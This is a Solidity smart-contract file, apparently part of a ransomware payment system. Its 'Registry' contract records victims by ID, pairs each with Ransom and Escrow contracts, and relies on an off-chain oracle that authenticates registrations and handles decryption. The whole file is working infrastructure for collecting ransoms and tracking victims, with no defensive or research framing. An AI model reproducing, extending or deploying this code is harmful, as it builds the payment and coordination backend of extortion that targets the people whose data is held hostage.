pragma solidity ^0.4.24;

import "./Escrow.sol";
import "./Ransom.sol";

///@title Registry contract
contract Registry {
    /**
     * @dev The Registry contract is what keeps track of all victims and associated Ransom and Escrow contracts. There
     * should only ever be one active Registry contract.
     */

    ///@dev VictimInfo struct for keeping track of the victim ID, Ransom and Escrow contract addresses
    struct VictimInfo {
        uint victimId;      //!< The unique ID of the victim
        address ransomAddr; //!< The address of the Ransom contract for the victim
        address escrowAddr; //!< The address of the Escrow contract associated with Ransom
    }

    ///@dev The AuthEvent is an event that gets triggered when a new Ransom contract is deployed and attempts to register
    ///with the Registry
    event AuthEvent(
        uint id,            //!< The unique ID of the victim
        address ransomAddr, //!< The address of the Ransom contract
        uint authToken,     //!< The one-time authentication code
        address origin      //!< The origin of the transaction
    );

    mapping(uint => VictimInfo) victimMap;      //!< Mapping from victim IDs to VictimInfo structs
    address owner;          //!< The address of the contract owner
    uint victims;           //!< Count of total victims
    address oracleAccount;  //!< The address of the off-chain authentication and decryption Oracle

    mapping(uint => VictimInfo) authMap;            //!< Mapping from victim IDs to VictimInfo structs (used before auth)
    uint16 pendingAuthCount;                         //!< Number of active pending authentications
    uint16 MAX_PENDING_AUTH_REQUESTS;  //!< Max number of pending authentications

    ///@dev Restricts the caller to be the Oracle account
    modifier restrictSenderToOracle {
        require(msg.sender == oracleAccount, "Only the Oracle can call this");
        _;
    }

    ///@dev Restricts the caller to be the owner account
    modifier restrictSenderToOwner {
        require(msg.sender == owner, "Only the Owner can call this");
        _;
    }

    /**
     * @dev Registry constructor
     * @param _oracleAccount address of the Oracle account
     */
    constructor(address _oracleAccount) public {
        owner = msg.sender;
        pendingAuthCount = 0;
        oracleAccount = _oracleAccount;
        victims = 0;
        MAX_PENDING_AUTH_REQUESTS = 0;  // start unused, may set later
    }

    /**
     * @dev Sets MAX_PENDING_AUTH_REQUESTS
     * @param maxPending requested value for MAX_PENDING_AUTH_REQUESTS, 0 to disable
     */
    function setMaxPending(uint16 maxPending) external restrictSenderToOwner {
        MAX_PENDING_AUTH_REQUESTS = maxPending;
    }

    /**
     * @dev Authenticates and register a new Victim. Anyone can call this function, but we rate limit to a max 
     * of MAX_PENDING_AUTH_REQUESTS pending requests at a time. The off-chain Oracle watches for AuthEvents and
     * processes each request.
     * @param id the unique ID of the victim
     * @param authToken the one-time authentication code
     * @return bool this function will always return true unless the MAX_PENDING_AUTH_REQUEST limit has been reached
     */
    function registerVictim(uint id, uint authToken) external returns (bool) {
        if (MAX_PENDING_AUTH_REQUESTS > 0 && pendingAuthCount == MAX_PENDING_AUTH_REQUESTS) {
            return false;
        }
        pendingAuthCount++;
        authMap[id] = VictimInfo(id, msg.sender, 0);

        emit AuthEvent(id, msg.sender, authToken, tx.origin);

        return true;
    }

    /**
     * @dev Authentication callback function restricted to the off-chain Oracle. The authResult indicates
     * whether authentication was succesful and to store the victim information.
     * @param id the unique ID of the victim
     * @param ransomAddr address of the Ransom contract
     * @param escrowAddr address of the Escrow contract
     * @param authResult true/false whether authentication succeeded
     */
    function authCallback(uint id, address ransomAddr, address escrowAddr, bool authResult) external restrictSenderToOracle {
        VictimInfo storage vicInfo = authMap[id]; 
        
        require(vicInfo.ransomAddr == ransomAddr && id == vicInfo.victimId, "unknown victim id");

        if (authResult == true) {
            vicInfo.escrowAddr = escrowAddr;
            victimMap[vicInfo.victimId] = vicInfo;
            victims++;
        }
        pendingAuthCount--;
        delete authMap[id];
        Escrow(escrowAddr).authCallback(id, ransomAddr, authResult);
        Ransom(ransomAddr).authCallback(escrowAddr, authResult);
    }

    /**
     * @dev Returns the total victim count
     * @return uint the number of registered victims
     */
    function victimCount() external view returns (uint) {
        return victims;
    }

    /**
     * @dev Gets the Ransom contract address for a given victim ID
     * @param victimId the unique ID of the victim
     * @return address the Ransom contract address
     */
    function getRansomAddressForVictim(uint victimId) external view returns (address) {
        return victimMap[victimId].ransomAddr;
    }

    /**
     * @dev Gets the Escrow contract address for a given victim ID
     * @param victimId the unique ID of the victim
     * @return address the Escrow contract address
     */
    function getEscrowAddressForVictim(uint victimId) external view returns (address) {
        return victimMap[victimId].escrowAddr;
    }
    
    /**
     * @dev Self-destructs this contract
     */
    function die() external restrictSenderToOwner {
        selfdestruct(owner);
    }

}
